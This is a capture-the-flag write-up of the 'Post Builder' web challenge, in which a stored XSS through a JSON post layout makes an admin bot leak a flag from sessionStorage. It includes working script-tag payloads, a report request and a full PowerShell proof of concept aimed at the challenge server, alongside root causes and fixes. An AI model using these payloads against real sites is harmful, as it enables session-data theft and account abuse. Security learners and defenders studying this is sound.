# Post Builder (0xacb) - Detailed Writeup

## Challenge Summary

- **Challenge name:** Post Builder
- **Author:** 0xacb
- **Type:** Web / Client-side exploitation (admin bot)
- **Flag format:** `upCTF{...}`

The app lets users create posts using a JSON-based layout system. Posts can be reported to an admin bot for review. The bot logs in as admin, stores the flag in `sessionStorage`, then visits the reported URL.

## Final Flag

`upCTF{r34ct_js_1s_still_j4v4scr1pt-WOlvfjOl2b4494e6}`

---

## 1. Source Code Recon

After extracting the provided archive, the important files were:

- `post-builder/app/backend/app.py`
- `post-builder/app/frontend/src/components/Element.js`
- `post-builder/bot/bot.js`

### 1.1 Admin bot behavior

In `bot.js`, the bot:

1. Opens the site login page.
2. Logs in as `admin`.
3. Stores the runtime flag in browser storage:

```js
sessionStorage.setItem('adminFlag', flag);
```

4. Navigates to the reported post URL.

This is the core security model mistake: sensitive data (`FLAG`) is moved into a browser context that renders attacker-controlled content.

### 1.2 Attacker-controlled rendering path

`Element.js` renders post JSON as DOM nodes with:

```js
React.createElement(wrapper, null, ...renderChildren(children))
```

The attacker controls:

- `wrapper` (tag name)
- `children` (nested nodes / text)

There are no explicit tag allowlists and no server-side sanitization of layout JSON.

### 1.3 Report endpoint

`/api/report` sends `{ url: WEB_URL + '/post/<id>' }` to the internal bot service. So the intended path is: attacker post -> admin bot visit -> data exfiltration.

---

## 2. Initial Exploit Attempts

I tested multiple payload forms expecting classic script execution:

- `script`
- `svg > script`
- `object > script`
- `iframe > script`
- `math > script`

These attempts were inconsistent per instance and often failed due:

- bot rate limits,
- transient 502 behavior in some instances,
- and React/browser handling of script insertion.

I also checked non-XSS direct leak routes:

- `/.env`
- traversal to `/proc/*/environ`
- debug/dev endpoints
- default admin creds

Those did not yield the flag.

---

## 3. Breakthrough Strategy

The key operational improvement was using a **fixed leak account** instead of random leak usernames.

Why this matters:

- If payload executes once, the account remains queryable.
- We can repeatedly trigger reports and simply attempt login to the same known account.
- This removes race/observability issues from one-shot random usernames.

Payload logic (in post layout):

1. Read `sessionStorage.getItem('adminFlag')`.
2. Send a registration request from the bot's authenticated browser context:

```js
fetch('/api/auth/register', {
	method: 'POST',
	headers: { 'Content-Type': 'application/json' },
	credentials: 'include',
	body: JSON.stringify({
		username: 'leakflaguser',
		email: sessionStorage.getItem('adminFlag') || 'x',
		password: 'LeakPass123!'
	})
})
```

Then log in as `leakflaguser` and read `/api/auth/me`. The `email` field contains the flag.

---

## 4. Working Exploit Flow

## 4.1 Register attacker

Create any attacker account and keep session cookies.

## 4.2 Create malicious post

Use a layout that includes multiple wrapper variants to increase execution chances in one bot visit:

```json
[
	{"wrapper":"script","children":["fetch('/api/auth/register',{method:'POST',headers:{'Content-Type':'application/json'},credentials:'include',body:JSON.stringify({username:'leakflaguser',email:sessionStorage.getItem('adminFlag')||'x',password:'LeakPass123!'})})"]},
	{"wrapper":"svg","children":[{"wrapper":"script","children":["fetch('/api/auth/register',{method:'POST',headers:{'Content-Type':'application/json'},credentials:'include',body:JSON.stringify({username:'leakflaguser',email:sessionStorage.getItem('adminFlag')||'x',password:'LeakPass123!'})})"]}]},
	{"wrapper":"object","children":[{"wrapper":"script","children":["fetch('/api/auth/register',{method:'POST',headers:{'Content-Type':'application/json'},credentials:'include',body:JSON.stringify({username:'leakflaguser',email:sessionStorage.getItem('adminFlag')||'x',password:'LeakPass123!'})})"]}]},
	{"wrapper":"math","children":[{"wrapper":"script","children":["fetch('/api/auth/register',{method:'POST',headers:{'Content-Type':'application/json'},credentials:'include',body:JSON.stringify({username:'leakflaguser',email:sessionStorage.getItem('adminFlag')||'x',password:'LeakPass123!'})})"]}]}
]
```

## 4.3 Report to admin

Call:

```http
POST /api/report
{"postId":"<malicious_post_id>"}
```

## 4.4 Retrieve exfiltrated flag

Wait a few seconds, then:

1. Login as `leakflaguser` / `LeakPass123!`
2. Call `/api/auth/me`
3. Read `user.email`

That value was:

`upCTF{r34ct_js_1s_still_j4v4scr1pt-WOlvfjOl2b4494e6}`

---

## 5. One-Command PowerShell PoC

This is the streamlined script pattern used successfully:

```powershell
$base='http://46.225.117.62:30005'
$att='att'+(Get-Random -Minimum 100000 -Maximum 999999)
$s=New-Object Microsoft.PowerShell.Commands.WebRequestSession
Invoke-RestMethod -Uri "$base/api/auth/register" -Method Post -WebSession $s -ContentType 'application/json' -Body (@{username=$att;email="$att@a.a";password='attackpw123'}|ConvertTo-Json -Compress) | Out-Null

$u='leakflaguser'
$p='LeakPass123!'
$code="fetch('/api/auth/register',{method:'POST',headers:{'Content-Type':'application/json'},credentials:'include',body:JSON.stringify({username:'$u',email:sessionStorage.getItem('adminFlag')||'x',password:'$p'})})"
$layout=@(
	@{wrapper='script';children=@($code)},
	@{wrapper='svg';children=@(@{wrapper='script';children=@($code)})},
	@{wrapper='object';children=@(@{wrapper='script';children=@($code)})},
	@{wrapper='math';children=@(@{wrapper='script';children=@($code)})}
)

$post=Invoke-RestMethod -Uri "$base/api/posts" -Method Post -WebSession $s -ContentType 'application/json' -Body (@{title='multi-fixed';layout=$layout}|ConvertTo-Json -Depth 25 -Compress)
Invoke-RestMethod -Uri "$base/api/report" -Method Post -WebSession $s -ContentType 'application/json' -Body (@{postId=$post.id}|ConvertTo-Json -Compress) | Out-Null

Start-Sleep -Seconds 12
$ls=New-Object Microsoft.PowerShell.Commands.WebRequestSession
Invoke-RestMethod -Uri "$base/api/auth/login" -Method Post -WebSession $ls -ContentType 'application/json' -Body (@{username=$u;password=$p}|ConvertTo-Json -Compress) | Out-Null
$me=Invoke-RestMethod -Uri "$base/api/auth/me" -Method Get -WebSession $ls
$me.user.email
```

---

## 6. Root Cause and Fixes

### Root causes

1. Sensitive flag exposed in admin browser storage.
2. Untrusted layout rendered into real DOM elements with no strict allowlist.
3. Admin bot visits attacker content in authenticated context.

### Recommended fixes

1. Never store secrets in `sessionStorage`/`localStorage`.
2. Apply a strict allowlist for renderable tags (e.g., `div`, `p`, `span`) and reject script-capable contexts.
3. Render untrusted content in a hardened sandbox (separate origin, strict CSP, no credentials).
4. Use bot isolation with no authenticated session carrying sensitive data.

---

## 7. Notes

- Some instances were unstable and returned intermittent `502` on non-root paths.
- Bot rate limiting made repeated report attempts expensive, so single high-density payloads were preferred.
- Fixed credentials for the leak user improved reliability and debugging significantly.

